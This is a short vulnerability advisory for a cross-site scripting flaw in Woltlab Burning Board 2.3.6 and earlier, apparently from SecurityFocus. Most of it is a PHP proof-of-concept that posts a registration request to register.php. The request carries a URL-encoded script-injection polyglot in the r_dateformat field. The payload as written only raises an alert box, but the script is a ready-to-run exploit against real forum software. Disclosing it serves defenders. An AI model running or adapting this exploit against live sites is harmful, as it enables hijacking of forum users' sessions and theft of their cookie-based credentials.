source: http://www.securityfocus.com/bid/21370/info

Woltlab Burning Board is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input. 

An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.

Woltlab Burning Board 2.3.6 and prior versions are vulnerable to this issue.

<?
$url = 'http://www.yoursite.com/wbb2/';
$length    = 5;
$key_chars = '123456789';
$rand_max  = strlen($key_chars) - 1;

for ($i = 0; $i < $length; $i++)
{
   $rand_pos  = rand(0, $rand_max);
   $rand_key[] = $key_chars{$rand_pos};
}

$rand = implode('', $rand_key);
$ch = curl_init();
curl_setopt($ch , CURLOPT_USERAGENT, $rand);
curl_setopt($ch , CURLOPT_URL , ''.$url.'register.php');
curl_setopt($ch , CURLOPT_POST , 1) ;
curl_setopt($ch , CURLOPT_POSTFIELDS ,
'r_username=aaaaaaaaa&r_email=aaaaaaaaa&r_password=aaaaaaaaa&r_confirmpassword=aaaaaaaaa&key_string=&key_number=1521&r_ho
mepage=&r_icq=&r_aim=&r_yim=&r_msn=&r_day=0&r_month=0&r_year=&r_gender=0&r_signature=&r_usertext=&field%5B1%5D=&field%5B2
%5D=&field%5B3%5D=&r_invisible=0&r_usecookies=1&r_admincanemail=1&r_showemail=1&r_usercanemail=1&r_emailnotify=0&r_notifi
cationperpm=0&r_receivepm=1&r_emailonpm=0&r_pmpopup=0&r_showsignatures=1&r_showavatars=1&r_showimages=1&r_daysprune=0&r_u
maxposts=0&r_threadview=0&r_dateformat=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28Strin
g.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28Str
ing.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2
C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D&r_timeformat=H%3Ai&r_startweek=1&r_timezoneoffset=1&r_usewysiw
 yg=0&r_styleid=0&r_langid=0&send=send&sid=&disclaimer=');
curl_exec($ch);
curl_close($ch);
?>